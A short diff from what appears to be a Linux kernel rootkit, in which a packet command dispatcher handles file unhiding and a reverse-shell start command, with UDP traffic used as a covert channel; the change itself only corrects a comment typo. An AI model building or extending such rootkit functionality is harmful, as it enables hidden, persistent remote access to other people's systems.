@@ -59,7 +59,7 @@ static int process_and_execute_command(command_packet_t *command) {
         unhide_file(command_data);
         break;
     case COMMAND_REVERSE_SHELL_START:
-        /* Will be handles by userspace */
+        /* Will be handled by userspace */
         break;
     default:
         return -ENOENT; /* Normal UDP traffic */
